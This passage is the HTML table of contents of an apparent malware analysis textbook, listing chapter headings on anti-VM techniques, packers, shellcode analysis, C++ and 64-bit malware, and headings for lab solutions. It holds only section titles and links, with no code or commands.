<li class="calibre7"><a href="index_split_006.html#p410">Using the str Instruction</a></li>
<li class="calibre7"><a href="index_split_006.html#p410">Anti-VM x86 Instructions</a></li>
<li class="calibre7"><a href="index_split_006.html#p410">Highlighting Anti-VM in IDA Pro</a></li>
<li class="calibre7"><a href="index_split_006.html#p412">Using ScoopyNG</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_006.html#p412">Tweaking Settings</a></li>
<li class="calibre7"><a href="index_split_007.html#p413">Escaping the Virtual Machine</a></li>
<li class="calibre7"><a href="index_split_007.html#p413">Conclusion</a></li>
<li class="calibre7"><a href="index_split_007.html#p414">Lab 17-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p414">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p414">Lab 17-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p414">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p415">Lab 17-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p415">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p416">18: Packers and Unpacking</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p417">Packer Anatomy</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p417">The Unpacking Stub</a></li>
<li class="calibre7"><a href="index_split_007.html#p417">Loading the Executable</a></li>
<li class="calibre7"><a href="index_split_007.html#p418">Resolving Imports</a></li>
<li class="calibre7"><a href="index_split_007.html#p419">The Tail Jump</a></li>
<li class="calibre7"><a href="index_split_007.html#p419">Unpacking Illustrated</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p420">Identifying Packed Programs</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p420">Indicators of a Packed Program</a></li>
<li class="calibre7"><a href="index_split_007.html#p420">Entropy Calculation</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p421">Unpacking Options</a></li>
<li class="calibre7"><a href="index_split_007.html#p421">Automated Unpacking</a></li>
<li class="calibre7"><a href="index_split_007.html#p422">Manual Unpacking</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p423">Rebuilding the Import Table with Import Reconstructor</a></li>
<li class="calibre7"><a href="index_split_007.html#p424">Finding the OEP</a></li>
<li class="calibre7"><a href="index_split_007.html#p428">Repairing the Import Table Manually</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p430">Tips and Tricks for Common Packers</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p430">UPX</a></li>
<li class="calibre7"><a href="index_split_007.html#p430">PECompact</a></li>
<li class="calibre7"><a href="index_split_007.html#p431">ASPack</a></li>
<li class="calibre7"><a href="index_split_007.html#p431">Petite</a></li>
<li class="calibre7"><a href="index_split_007.html#p431">WinUpack</a></li>
<li class="calibre7"><a href="index_split_007.html#p433">Themida</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p433">Analyzing Without Fully Unpacking</a></li>
<li class="calibre7"><a href="index_split_007.html#p434">Packed DLLs</a></li>
<li class="calibre7"><a href="index_split_007.html#p435">Conclusion</a></li>
<li class="calibre7"><a href="index_split_007.html#p436">Labs</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p438">Part 6: Special Topics</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_007.html#p440">19: Shellcode Analysis</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p441">Loading Shellcode for Analysis</a></li>
<li class="calibre7"><a href="index_split_007.html#p441">Position-Independent Code</a></li>
<li class="calibre7"><a href="index_split_007.html#p442">Identifying Execution Location</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p442">Using call/pop</a></li>
<li class="calibre7"><a href="index_split_007.html#p444">Using fnstenv</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p446">Manual Symbol Resolution</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p446">Finding kernel32.dll in Memory</a></li>
<li class="calibre7"><a href="index_split_007.html#p448">Parsing PE Export Data</a></li>
<li class="calibre7"><a href="index_split_007.html#p450">Using Hashed Exported Names</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p451">A Full Hello World Example</a></li>
<li class="calibre7"><a href="index_split_007.html#p454">Shellcode Encodings</a></li>
<li class="calibre7"><a href="index_split_007.html#p455">NOP Sleds</a></li>
<li class="calibre7"><a href="index_split_007.html#p456">Finding Shellcode</a></li>
<li class="calibre7"><a href="index_split_007.html#p457">Conclusion</a></li>
<li class="calibre7"><a href="index_split_007.html#p458">Lab 19-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p458">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p458">Lab 19-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p458">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p458">Lab 19-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p459">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p460">20: C++ Analysis</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p460">Object-Oriented Programming</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p461">The this Pointer</a></li>
<li class="calibre7"><a href="index_split_007.html#p463">Overloading and Mangling</a></li>
<li class="calibre7"><a href="index_split_007.html#p465">Inheritance and Function Overriding</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p465">Virtual vs. Nonvirtual Functions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p467">Use of Vtables</a></li>
<li class="calibre7"><a href="index_split_007.html#p468">Recognizing a Vtable</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p470">Creating and Destroying Objects</a></li>
<li class="calibre7"><a href="index_split_007.html#p471">Conclusion</a></li>
<li class="calibre7"><a href="index_split_007.html#p472">Lab 20-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p472">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p472">Lab 20-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p472">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p472">Lab 20-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p473">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_007.html#p474">21: 64-Bit Malware</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_007.html#p475">Why 64-Bit Malware? </a></li>
<li class="calibre7"><a href="index_split_007.html#p476">Differences in x64 Architecture</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p477">Differences in the x64 Calling Convention and Stack Usage</a></li>
<li class="calibre7"><a href="index_split_008.html#p480">64-Bit Exception Handling</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p480">Windows 32-Bit on Windows 64-Bit</a></li>
<li class="calibre7"><a href="index_split_008.html#p481">64-Bit Hints at Malware Functionality</a></li>
<li class="calibre7"><a href="index_split_008.html#p482">Conclusion</a></li>
<li class="calibre7"><a href="index_split_008.html#p483">Lab 21-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p483">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p483">Lab 21-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p483">Questions</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p486">A: Important Windows Functions</a></li>
<li class="calibre7"><a href="index_split_008.html#p498">B: Tools for Malware Analysis</a></li>
<li class="calibre7"><a href="index_split_008.html#p510">C: Solutions to Labs</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_008.html#p510">Chapter 1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p510">Lab 1-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p510">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p511">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p512">Lab 1-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p512">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p512">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p513">Lab 1-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p513">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p513">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p514">Lab 1-4 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p514">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p514">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p515">Chapter 3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p515">Lab 3-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p515">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p515">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p518">Lab 3-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p518">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p519">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p523">Lab 3-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p523">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p523">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p525">Lab 3-4 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p525">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p525">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p527">Chapter 5</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p527">Lab 5-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p527">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p528">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p534">Chapter 6</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p534">Lab 6-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p534">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p534">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_008.html#p536">Lab 6-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_008.html#p536">Short Answers</a></li>
<li class="calibre7"><a href="index_split_008.html#p536">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p540">Lab 6-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p540">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p541">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p544">Lab 6-4 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p544">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p544">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p546">Chapter 7</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p546">Lab 7-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p546">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p546">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p550">Lab 7-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p550">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p550">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p552">Lab 7-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p552">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p553">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p563">Chapter 9</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p563">Lab 9-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p563">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p563">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p572">Lab 9-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p572">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p573">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p578">Lab 9-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p578">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p578">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p581">Chapter 10</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p581">Lab 10-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p581">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p582">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p587">Lab 10-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p587">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p587">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_009.html#p593">Lab 10-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_009.html#p593">Short Answers</a></li>
<li class="calibre7"><a href="index_split_009.html#p593">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p599">Chapter 11</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p599">Lab 11-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p599">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p600">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p604">Lab 11-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p604">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p604">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p614">Lab 11-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p614">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p614">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p619">Chapter 12</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p619">Lab 12-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p619">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p619">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p623">Lab 12-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p623">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p623">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p630">Lab 12-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p630">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p630">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p632">Lab 12-4 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p632">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p633">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_010.html#p640">Chapter 13</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p640">Lab 13-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_010.html#p640">Short Answers</a></li>
<li class="calibre7"><a href="index_split_010.html#p640">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p645">Lab 13-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p645">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p645">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p650">Lab 13-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p650">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p651">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p659">Chapter 14</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p659">Lab 14-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p659">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p660">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p665">Lab 14-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p665">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p666">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p670">Lab 14-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p670">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p672">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p678">Chapter 15</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p678">Lab 15-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p678">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p678">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p679">Lab 15-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p679">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p680">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p685">Lab 15-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p685">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p685">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p688">Chapter 16</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p688">Lab 16-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p688">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p689">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_011.html#p693">Lab 16-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_011.html#p693">Short Answers</a></li>
<li class="calibre7"><a href="index_split_011.html#p694">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p698">Lab 16-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p698">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p698">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p703">Chapter 17</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p703">Lab 17-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p703">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p703">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p706">Lab 17-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p706">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p706">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p711">Lab 17-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p711">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p711">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p717">Chapter 18</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p717">Lab 18-1 Solutions</a></li>
<li class="calibre7"><a href="index_split_012.html#p718">Lab 18-2 Solutions</a></li>
<li class="calibre7"><a href="index_split_012.html#p719">Lab 18-3 Solutions</a></li>
<li class="calibre7"><a href="index_split_012.html#p722">Lab 18-4 Solutions</a></li>
<li class="calibre7"><a href="index_split_012.html#p724">Lab 18-5 Solutions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p729">Chapter 19</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p729">Lab 19-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p729">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p729">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p732">Lab 19-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p732">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p732">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_012.html#p736">Lab 19-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_012.html#p736">Short Answers</a></li>
<li class="calibre7"><a href="index_split_012.html#p737">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_013.html#p745">Chapter 20</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p745">Lab 20-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p745">Short Answers</a></li>
<li class="calibre7"><a href="index_split_013.html#p745">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_013.html#p746">Lab 20-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p746">Short Answers</a></li>
<li class="calibre7"><a href="index_split_013.html#p747">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_013.html#p750">Lab 20-3 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p750">Short Answers</a></li>
<li class="calibre7"><a href="index_split_013.html#p750">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_013.html#p756">Chapter 21</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p756">Lab 21-1 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p756">Short Answers</a></li>
<li class="calibre7"><a href="index_split_013.html#p757">Detailed Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_013.html#p761">Lab 21-2 Solutions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_013.html#p761">Short Answers</a></li>
<li class="calibre7"><a href="index_split_013.html#p762">Detailed Analysis</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_013.html#p766">Index</a></li>
</ul><p class="calibre1"/>


</body></html>